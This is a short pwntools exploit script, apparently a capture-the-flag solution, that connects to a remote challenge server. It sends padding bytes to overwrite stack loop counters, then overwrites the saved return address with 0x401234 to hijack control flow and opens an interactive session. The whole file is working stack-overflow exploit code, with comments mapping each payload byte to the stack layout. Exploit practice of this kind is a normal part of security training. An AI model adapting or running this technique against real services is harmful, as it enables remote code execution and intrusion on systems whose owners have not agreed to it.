from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "debug"

io = remote("node10.anna.nssnode.cn", 29078)

io.recvuntil("\n")

# s[0:7] -> padding_bytes[4]:j[3]
for _ in range(21):
    io.send(b'\x00' * 8)
    
# i++; // i = 22
# j++; // j = 22
    
# padding_bytes[5:7], j[0:3], i[0]
io.send(b'\x00' * 3 + b'\x1f\x00\x00\x00' + b"\x26")
# i = (0x26 == 38)
# j = (0x1f == 31)

# i++; // i = (0x27 == 39)
# j++; // j = (0x20 == 32)

# __saved_registers[7], __return_address[0:6]
io.send(b"A" + p64(0x401234)[:7])

io.interactive()